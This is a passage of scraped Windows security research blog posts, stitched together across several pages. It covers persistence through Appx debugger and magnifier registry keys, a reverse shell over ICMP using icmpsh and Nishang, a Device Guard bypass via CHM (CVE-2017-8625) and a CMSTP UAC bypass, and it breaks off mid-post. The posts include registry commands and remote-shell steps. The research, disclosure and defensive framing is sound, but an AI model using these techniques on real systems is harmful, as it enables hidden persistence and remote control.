Posted on [6 Sep 20187 Sep 2018](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

TL;DR Persistence can be achieved with Appx/UWP apps using the debugger options. This technique will not be visible by Autoruns. Two different approaches exists (registry keys). Listed below are the two techniques for two different apps that starts at logon: Cortana app: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\PackagedAppXDebug\Microsoft.Windows.Cortana\_1.10.7.17134\_neutral\_neutral\_cw5n1h2txyewy /d "C:\windows\system32\cmd.exe" OR reg add HKCU\Software\Classes\ActivatableClasses\Package\Microsoft.Windows.Cortana\_1.10.7.17134\_neutral\_neutral\_cw5n1h2txyewy\DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca /v DebugPath /d "C:\windows\system32\cmd.exe" … [Continue reading Persistence using Universal Windows Platform apps (APPX) →](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/)

Tagged [autoruns](https://oddvar.moe/tag/autoruns/), [bypass](https://oddvar.moe/tag/bypass/), [hacking](https://oddvar.moe/tag/hacking/), [persistence](https://oddvar.moe/tag/persistence/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[4 Comments](https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/#comments)

## [AppLocker for admins – Does it work?](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)

Posted on [27 Jul 2018](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

A thing I see a lot is that AppLocker is used to "protect" servers and prevent admins from doing certain things. In this post I want to go over what sort of security this gives so that everyone can see Pros and Cons. A thing to remember is that an administrator has all the rights … [Continue reading AppLocker for admins – Does it work? →](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [security](https://oddvar.moe/tag/security/), [windows](https://oddvar.moe/tag/windows/)[1 Comment](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/#comments)

## [Another way to get to a system shell – Assistive Technology](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/)

Posted on [23 Jul 201825 Jul 2018](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

TL;DR Manipulate HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\magnifier - StartExe to run other binary when pressing WinKey and plus to zoom. Can load binary from Webdav and also start webbrowser and browse to desired link Runs command as system during UAC prompt and logon screen   I have thought a while about this blogpost and finally had some time to … [Continue reading Another way to get to a system shell – Assistive Technology →](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/)

Tagged [persistence](https://oddvar.moe/tag/persistence/), [research](https://oddvar.moe/tag/research/)[4 Comments](https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/#comments)

## [Real whitelisting attempt using AppLocker](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)

Posted on [14 May 201814 May 2018](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

I wanted to try and see if I was able to use AppLocker to only allow needed files (Real whitelisting). Normally what you would do when setting up AppLocker is that you would start out by trusting something. This something could either be everything under C:\windows and c:\programfiles, or it could be every file that … [Continue reading Real whitelisting attempt using AppLocker →](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)

Tagged [AppLocker](https://oddvar.moe/tag/applocker/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/)[Leave a comment](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/#respond)

## Posts navigation

[Older posts](https://oddvar.moe/author/oddvarhmoe/page/2/)

* [Facebook](https://www.facebook.com/oddvarmoe)
* [LinkedIn](https://www.linkedin.com/in/oddvarmoe/)
* [Twitter](http://www.twitter.com/oddvarmoe)

Search for:

[Website Powered by WordPress.com](https://wordpress.com/?ref=footer_custom_powered).

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)

  Join 41 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2019%252F05%252F29%252Fa-small-discovery-about-applocker%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2019%252F05%252F29%252Fa-small-discovery-about-applocker%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://oddvar.moe)
  + [View site in Reader](https://wordpress.com/read/feeds/74916725)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from portal.msrc.microsoft.com_02e0c9fb_20250126_054321.html ===
You need to enable JavaScript to run this app.

=== Content from oddvar.moe_92b77efe_20250126_054319.html ===

[Skip to content](#content)
Menu

* [Home](/)
* [About](https://oddvar.moe/about/)
* [Presentations](https://oddvar.moe/presentations/)
* [Articles](https://oddvar.moe/articles/)
* [AppLocker Case study](https://oddvar.moe)
  + [AppLocker – Case study – Part 1](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
  + [AppLocker – Case study – Part 2](https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/)
  + [AppLocker – Hardening – Part 1](https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/)
  + [AppLocker – Hardening – Part 2](https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/)
  + [AppLocker for admins – Does it work?](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)
  + [Bypassing AppLocker as an admin](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)
  + [AppLocker – Making sure that local rules are removed](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)
  + [Real whitelisting attempt using AppLocker](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)
  + [Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [Previous Blogs](https://oddvar.moe)
  + [MSItpros – Waybackmachine](https://web.archive.org/web/20201101151155/http%3A//msitpros.com/)
  + [moe.am – Waybackmachine](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/)

[Oddvar Moe's Blog](https://oddvar.moe/)

Notes from My adventures with Windows security

# Ping is okay? – Right?

Posted on [30 May 20177 Nov 2017](https://oddvar.moe/2017/05/30/ping-is-okay-right/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

**TL;DR**

You can run a remote shell through ICMP. ICMP can be used for bad.

Many customers have asked me this question many times, and in general ICMP (ICMP is a lot more than just ping, but is often referred to as ping for simplicity) is a nice thing to use to verify if things on the network is responding, or to verify if you have an active internet connection. It is often also used to measure if links are reliable. My point is that from an IT Pro perspective there are many things we use ICMP for. The thing I want people to be aware of is that almost anything you allow out from your network can be misused for evil. In this post I will show you how an adversary can use ICMP to exfiltrate data and communicate with a client on the inside communicating only over ICMP.

The theory on using ICMP for evil is pretty straight forward and was written about as early as 1996. It came out in the PHRACK magazine (memory lane ) <http://phrack.org/issues/49/1.html> and referenced to as Project Loki.

The theory in using ICMP as a covert channel is that you have a server and a client side, and when they communicate they use the data portion of the ICMP\_ECHO and the ICMP\_ECHOREPLY. This meaning that data can be sent and received through the Data part of the ICMP packets.

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay1.png?w=700)

I think this is cool. How many are looking at ICMP traffic at an analytic level? (I am making assumptions here)

ICMP is just one possible covert channel, it could for instance be DNS if the adversary preferred that. There are DNS covert channel projects out there (Google it). Every channel your network can use outwards towards Internet can most likely be used by an adversary as a covert channel. This blogpost however discusses ICMP.

Here is a quick demo with screenshots of how this works using the ICMPSH tool ported to Python by Bernardo Damele. The tool was originally made by Nico Leidecker – <http://www.leidecker.info/>

First on my attacker machine I turn of ICMP replies. Don’t want to mess up the Covert Channel sending junk…

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay2.png?w=700)

Off command: **sysctl -w net.ipv4.icmp\_echo\_ignore\_all=1**On command: **sysctl -w net.ipv4.icmp\_echo\_ignore\_all=0**

Then I need clone the ICMPSH github project to my attacker machine:

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay3.png?w=700)

Git clone <https://github.com/inquisb/icmpsh.git>

First I start my server side using the python script within the ICMPSH project. I use this command:

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay4.png?w=700)

Python icmpsh\_m.py x.x.x.x y.y.y.y

Now the attacker machine will wait. Next we go to the client we want to control. There is an executable within the ICMPSH.git project that you can use on the windows clients, but I prefer to use Powershell. So in this walkthrough I use Nishang PowerShellICMP. The code can be found here (thanks Nikhil Mittal for awesome work):

<https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1>

Take the code and paste it into a Powershell window on the client. The Powershell does not need to be elevated and the user does not need to be a local administrator.

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay5.png?w=700)

Then invoke the new defined function like this:

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay6.png?w=700)

If you now go back to your attacker pc you will now have shell access over ICMP (just like magic):

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay7.png?w=700)

The interesting part is looking at the traffic from the client. If I run Wireshark and filter out only the traffic from my VM I see this when I issue commands through the shell:

![](https://oddvar.moe/wp-content/uploads/2017/05/053017_1538_pingisokay8.png?w=700)

So, to answer the blogpost question, “Is ping okay?”, I would say you need to evaluate the risks in your environment. There is no answer that fits all situations. Of course, the hacker needs to get control of one host in order to use this method, but as I always say. Think of security as layers of defense. Don’t rely on only a few layers. Think ahead.

For example:

– What if the hacker gains access to a client?

— I have AppLocker to prevent execution of code

—What if the attacker bypasses AppLocker

—-Users don’t have local admin rights

—–What if the attacker gains local admin rights?

——The client computers cannot communicate with other client computers and data containing sensitive data are isolated.

Of course, preventing covert channels using ICMP/DNS etc. is a good idea in general. But often in modern networks today there are so many other ways of getting data in and out of a network, that using a ICMP tunnel is something the attackers often does not need to do.

Also worth mentioning that there are projects that can use ICMP as a way of proxying traffic out towards Internet. For instance some public wifi requires you to register before gaining full wifi access, but ICMP is often open before you authorize towards captive portals. Meaning that you can tunnel your traffic through an ICMP proxy and get free Internet.

Examples:

<http://dries.eu/rpms/ptunnel/ptunnel>

<http://neophob.com/2007/10/pingtunnel-for-windows-icmp-tunnel/>

( I have not tested these tools, and there are probably more tools like this if you search for them)

I hope this post illustrated that innocent things like ping can be used for evil as well.

### Share this:

* [Twitter](https://oddvar.moe/2017/05/30/ping-is-okay-right/?share=twitter "Click to share on Twitter")
* [Facebook](https://oddvar.moe/2017/05/30/ping-is-okay-right/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Tagged [hacking](https://oddvar.moe/tag/hacking/), [research](https://oddvar.moe/tag/research/)

## Post navigation

[Previous Post Clarification – BGInfo 4.22 – AppLocker still vulnerable](https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/)[Next Post Bypassing Device guard UMCI using CHM – CVE-2017-8625](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/)

## 3 thoughts on “Ping is okay? – Right?”

1. ![](https://0.gravatar.com/avatar/c83b239add1e24676ab09b196cd785063fb680a13abca6585d1ad9d3dba0dbbc?s=100&d=wavatar&r=G) **[Itzik Kotler](http://www.ikotler.org)** says:
   [4 Jun 2017 at 6:07 pm](https://oddvar.moe/2017/05/30/ping-is-okay-right/#comment-27)

   Great article! I wrote about this issue a few years ago:

   <https://safebreach.com/Post/I-See-Your-True-Echo-Request-Patterns-Pinging-Data-Away>

   My focus was using Linux’s ping program and other popular programs like ‘xxd’ and ‘xargs’ to implement a sender, and Python + scapy framework to implement a receiver

   [Like](https://oddvar.moe/2017/05/30/ping-is-okay-right/?like_comment=27&_wpnonce=ee942eac83)Like

   [Reply](https://oddvar.moe/2017/05/30/ping-is-okay-right/?replytocom=27#respond)
3. ![](https://1.gravatar.com/avatar/d41d6b7660a0acb67bfa6056fab4aff047e6f0aae1f9a14b58f3cfa5df916db8?s=100&d=wavatar&r=G) **Peter** says:
   [6 Jun 2017 at 5:44 pm](https://oddvar.moe/2017/05/30/ping-is-okay-right/#comment-28)

   in that case, from network perspective, how do you detect this activity and deem it as malicious?

   [Like](https://oddvar.moe/2017/05/30/ping-is-okay-right/?like_comment=28&_wpnonce=2786bff587)Like

   [Reply](https://oddvar.moe/2017/05/30/ping-is-okay-right/?replytocom=28#respond)
   1. ![](https://1.gravatar.com/avatar/739f1937a78b0adcf9e9299e625c6b3a1d3a22b69a647bb2db49efc9c2559c93?s=100&d=wavatar&r=G) **Oddvar Moe** says:
      [6 Jun 2017 at 9:34 pm](https://oddvar.moe/2017/05/30/ping-is-okay-right/#comment-29)

      I am not 100% sure, but a good start would be emerging threats: <https://rules.emergingthreats.net/open/snort-2.9.0/rules/emerging-icmp.rules>

      [Like](https://oddvar.moe/2017/05/30/ping-is-okay-right/?like_comment=29&_wpnonce=0f764c8eba)Like

      [Reply](https://oddvar.moe/2017/05/30/ping-is-okay-right/?replytocom=29#respond)

### Leave a comment [Cancel reply](/2017/05/30/ping-is-okay-right/#respond)

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

* [Facebook](https://www.facebook.com/oddvarmoe)
* [LinkedIn](https://www.linkedin.com/in/oddvarmoe/)
* [Twitter](http://www.twitter.com/oddvarmoe)

Search for:

[Website Powered by WordPress.com](https://wordpress.com/?ref=footer_custom_powered).

* [Comment](https://oddvar.moe/2017/05/30/ping-is-okay-right/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)

  Join 41 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2017%252F05%252F30%252Fping-is-okay-right%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2017%252F05%252F30%252Fping-is-okay-right%252F)
  + [Copy shortlink](https://wp.me/p9lQpG-10x)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://oddvar.moe/2017/05/30/ping-is-okay-right/)
  + [View post in Reader](https://wordpress.com/read/blogs/138193392/posts/3877)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from portal.msrc.microsoft.com_c65d72d3_20250126_054312.html ===
You need to enable JavaScript to run this app.

=== Content from oddvar.moe_2ee71366_20250126_054309.html ===

[Skip to content](#content)
Menu

* [Home](/)
* [About](https://oddvar.moe/about/)
* [Presentations](https://oddvar.moe/presentations/)
* [Articles](https://oddvar.moe/articles/)
* [AppLocker Case study](https://oddvar.moe)
  + [AppLocker – Case study – Part 1](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
  + [AppLocker – Case study – Part 2](https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/)
  + [AppLocker – Hardening – Part 1](https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/)
  + [AppLocker – Hardening – Part 2](https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/)
  + [AppLocker for admins – Does it work?](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)
  + [Bypassing AppLocker as an admin](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)
  + [AppLocker – Making sure that local rules are removed](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)
  + [Real whitelisting attempt using AppLocker](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)
  + [Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [Previous Blogs](https://oddvar.moe)
  + [MSItpros – Waybackmachine](https://web.archive.org/web/20201101151155/http%3A//msitpros.com/)
  + [moe.am – Waybackmachine](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/)

[Oddvar Moe's Blog](https://oddvar.moe/)

Notes from My adventures with Windows security

# Bypassing Device guard UMCI using CHM – CVE-2017-8625

Posted on [13 Aug 201718 Aug 2023](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

TL;DR

You could/can bypass Device Guard user mode code integrity with a custom CHM and execute code.

The last 6 months I have done some security research on my (little) spare time, because I find that very interesting. During this time, I was lucky enough to find another valid Device Guard UMCI bypass (I found the bginfo.exe as well: <https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/>) and reported this to the Microsoft Security Response Center (secure@microsoft.com).

After a dialog with MSRC they told me that this was already discovered by another security researcher and that this would become a CVE with my name on it as well. (This was big news to me )

MSRC could not tell who the other researcher was, but [Matt Graeber](https://twitter.com/mattifestation) knew (Love that guy) . The other researcher was [Matt Nelson](https://twitter.com/enigma0x3) and he had found this bypass a while back. Awesome!

Anyways this blogpost looks into how I made the discovery and some PoC code as well.

I am not a hardcore reverse engineer (yet ), so I will not do a full disassembly tour of the fix Microsoft has done, but rather focusing on how I found this.

For me this discovery started as I was looking through binary files in the windows and the system32 folder. I do this from time to time to discover new stuff.

I stumbled upon a binary file called hh.exe.

I went on and ran “hh.exe /?”. Assuming I either would get some help on the command or an error. Well, that is not what happened.

I got this instead:

![](https://oddvar.moe/wp-content/uploads/2017/08/081317_2105_bypassingde1.png?w=700)

This triggered my curiosity to the max. This trick btw still works on the latest Windows 10 and I guess if you ever need to have an explorer in a locked down environment (Terminal server etc) this could do it. You could also run for instance “hh.exe c:”.

After trying a lot of different stuff, I realized you could also browse the internet through hh.exe. Just by typing “hh.exe <http://www.google.com&#8221>; proves this. (Still works in the latest Windows 10)

It looks like this:

![](https://oddvar.moe/wp-content/uploads/2017/08/081317_2105_bypassingde2.png?w=700)

The first thing that struck my mind was to check the integrity level of the hh.exe process and guess what….

![](https://msitpros.com/wp-content/uploads/2017/08/081317_2105_BypassingDe3.png)

Yeah, my “browser” inside hh.exe is running in medium integrity mode and a normal iexplore process runs in Low. This should make it easier to exploit the browser inside hh.exe. (There is more research to be done here)

After trying a lot of different approaches, I thought I would try to create a custom help file with code inside, since HH.exe is primarily used for displaying help files.

I searched the web for any valid sources of these kinds of projects and stumbled upon this:

<https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1>

(thanks to Nikhil “SamratAshok” Mittal)

To run this script, I had to download and install the “HTML Help Workshop and Documentation” first:

<http://www.microsoft.com/en-us/download/details.aspx?id=21138>

I ended up creating my own version of Nikhil’s script, since I only wanted to prove my PoC and pop a Calculator.

My PoC script can be found here:

<https://gist.githubusercontent.com/api0cradle/95ae3c7120f16255d94088bd8959f4b2/raw/fa25b85e85bbb64c5cf021adf92b125357086a6f/GenerateCHM_1.0.ps1>

This script generates a simple .CHM that starts Calc.exe through ActiveX. There are certainly far more interesting things you can do.

For instance, running [Cn33liz](https://twitter.com/Cneelis) StarFighters to get an Empire agent going: <https://github.com/Cn33liz/StarFighters/>

The interesting part of my PoC script are these lines:

![](https://msitpros.com/wp-content/uploads/2017/08/081317_2105_BypassingDe4.png)

This gif shows you the Device Guard bypass in action:

[![](https://oddvar.moe/wp-content/uploads/2017/08/cve-2017-8625.gif?w=700)](https://oddvar.moe/wp-content/uploads/2017/08/cve-2017-8625.gif)

This issue is fixed in the Windows 10 Creators update v1703 (aka Redstone 2) or if you want to patch it on older versions of Windows 10 you can find the correct patch here: <https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625>

After I updated my machine to v1703 of Windows 10 I got this error when I tried to run the custom CHM file:

![](https://oddvar.moe/wp-content/uploads/2017/08/081317_2105_bypassingde6.png?w=700)

For you defenders out there, I would also monitor hh.exe and look at what the process is doing on your machines. Could be evil stuff going on.

That’s it. Hope this was interesting to read and that it inspired you to conduct your own security research to make Windows even more secure. If you are interested in learning more about Device Guard I suggest reading Microsoft official documentation and some blogposts by Matt Graeber (they have helped me):

<https://docs.microsoft.com/en-us/windows/device-security/device-guard/device-guard-deployment-guide>

<http://www.exploit-monday.com/2016/09/introduction-to-windows-device-guard.html>

<http://www.exploit-monday.com/2016/09/using-device-guard-to-mitigate-against.html>

<http://www.exploit-monday.com/2016/10/code-integrity-policy-reference.html>

<http://www.exploit-monday.com/2016/11/code-integrity-policy-audit-methodology.html>

<http://www.exploit-monday.com/2016/11/Effectiveness-of-Device-Guard-UMCI.html>

<http://www.exploit-monday.com/2016/12/updating-device-guard-code-integrity.html>

Remember to send your discoveries to secure@microsoft.com and do not use your discoveries for evil. #WhiteHat4Life

### Share this:

* [Twitter](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/?share=twitter "Click to share on Twitter")
* [Facebook](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Tagged [bypass](https://oddvar.moe/tag/bypass/), [CVE](https://oddvar.moe/tag/cve/), [research](https://oddvar.moe/tag/research/), [security](https://oddvar.moe/tag/security/)

## Post navigation

[Previous Post Ping is okay? – Right?](https://oddvar.moe/2017/05/30/ping-is-okay-right/)[Next Post Research on CMSTP.exe](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/)

## 5 thoughts on “Bypassing Device guard UMCI using CHM – CVE-2017-8625”

1. Pingback: [[ Sharing ] Analysing simple tricks used in malicious documents | VXSecurity – something strange happens inside it](http://www.vxsecurity.sg/2017/08/11/sharing-analysing-simple-tricks-used-in-malicious-documents/)
3. Pingback: [【技术分享】CVE-2017-8625：使用自定义CHM文件绕过Windows 10的Device Guard - 莹莹之色](http://hack.hk.cn/2017/08/25/%E3%80%90%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E3%80%91cve-2017-8625%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%87%AA%E5%AE%9A%E4%B9%89chm%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87windows-10%25)
5. Pingback: [Cómo saltarse Device Guard en Windows 10 con CVE-2017-8625 - Blog Paginas Web Ciudad Real - Seguridad informática, Diseño web, Páginas web](https://www.paginaswebciudadreal.es/blog/saltarse-device-guard-windows-10-cve-2017-8625/)
7. Pingback: [MOV AX, BX Code depilation salon: Articles, Code samples, Processor code documentation, Low-level programming, Working with debuggers List of Awesome Red Teaming Resources](https://movaxbx.ru/2018/10/31/list-of-awesome-red-teaming-resources/)
9. Pingback: [RED TEAMING\_Final Att&ck – B4cKD00₹](https://bkd00r.wordpress.com/2021/01/10/red-teaming_final-attck/)

### Leave a comment [Cancel reply](/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/#respond)

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

* [Facebook](https://www.facebook.com/oddvarmoe)
* [LinkedIn](https://www.linkedin.com/in/oddvarmoe/)
* [Twitter](http://www.twitter.com/oddvarmoe)

Search for:

[Website Powered by WordPress.com](https://wordpress.com/?ref=footer_custom_powered).

* [Comment](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/#comments)
* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)

  Join 41 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2017%252F08%252F13%252Fbypassing-device-guard-umci-using-chm-cve-2017-8625%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Oddvar Moe's Blog](https://oddvar.moe)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Foddvar.moe%252F2017%252F08%252F13%252Fbypassing-device-guard-umci-using-chm-cve-2017-8625%252F)
  + [Copy shortlink](https://wp.me/p9lQpG-113)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/)
  + [View post in Reader](https://wordpress.com/read/blogs/138193392/posts/3909)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from oddvar.moe_4b6783fc_20250126_054320.html ===

[Skip to content](#content)
Menu

* [Home](/)
* [About](https://oddvar.moe/about/)
* [Presentations](https://oddvar.moe/presentations/)
* [Articles](https://oddvar.moe/articles/)
* [AppLocker Case study](https://oddvar.moe)
  + [AppLocker – Case study – Part 1](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
  + [AppLocker – Case study – Part 2](https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/)
  + [AppLocker – Hardening – Part 1](https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/)
  + [AppLocker – Hardening – Part 2](https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/)
  + [AppLocker for admins – Does it work?](https://oddvar.moe/2018/07/27/applocker-for-admins-does-it-work/)
  + [Bypassing AppLocker as an admin](https://oddvar.moe/2019/02/01/bypassing-applocker-as-an-admin/)
  + [AppLocker – Making sure that local rules are removed](https://oddvar.moe/2018/09/28/applocker-making-sure-that-local-rules-are-removed/)
  + [Real whitelisting attempt using AppLocker](https://oddvar.moe/2018/05/14/real-whitelisting-attempt-using-applocker/)
  + [Ultimate AppLocker Bypass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [Previous Blogs](https://oddvar.moe)
  + [MSItpros – Waybackmachine](https://web.archive.org/web/20201101151155/http%3A//msitpros.com/)
  + [moe.am – Waybackmachine](https://web.archive.org/web/20120625102124/http%3A//www.moe.am/)

[Oddvar Moe's Blog](https://oddvar.moe/)

Notes from My adventures with Windows security

# Research on CMSTP.exe

Posted on [15 Aug 201712 Jun 2018](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/) by [Oddvar Moe [MVP]](https://oddvar.moe/author/oddvarhmoe/)

Whenever I have a chance I use my time diving into Windows internal binaries to uncover hidden functionality. This blogpost is dedicated to things I have discovered with the CMSTP.exe binary file.

I found a UAC Bypass using sendkeys and a way to load DLL files from a Webdav server. I know the bypass I discovered is kind of noobish, but if this blogpost inspires someone to do some more research or come up with something better I am satisfied. There is probably even more stuff to be uncovered in this binary so please go ahead.

I have reported this to MSRC and the case is closed from their side.

UAC bypasses is not something Microsoft prioritizes and the correct way setting up things is to prevent local administrator access for the end-users. (UAC is not a security boundary)

If you want to read more about UAC and its insecurity I recommend reading [James Foreshaw’s](https://twitter.com/tiraniddo) excellent blogposts on the topic:

<https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-1.html>

<https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-2.html>

<https://tyranidslair.blogspot.no/2017/05/reading-your-way-around-uac-part-3.html>

## TL;DR – UAC BYPASS

Download this inf and this script and save them on a system:

<https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypasscmstp-ps1>

<https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e#file-uacbypass-inf>

**Update 22.08.2017:**

Tyler created an updated version of this script that is way more awesome than my original.

The script does not need the inf file and the script is self-contained.

You can find it here:

<https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1>

Adjust script and run.

[![](https://oddvar.moe/wp-content/uploads/2017/08/uac-bypass-sendkeys-cmstp.gif?w=700)](https://oddvar.moe/wp-content/uploads/2017/08/uac-bypass-sendkeys-cmstp.gif)

## TL;DR – Load DLL from Webdav

Download these files (file names are important):

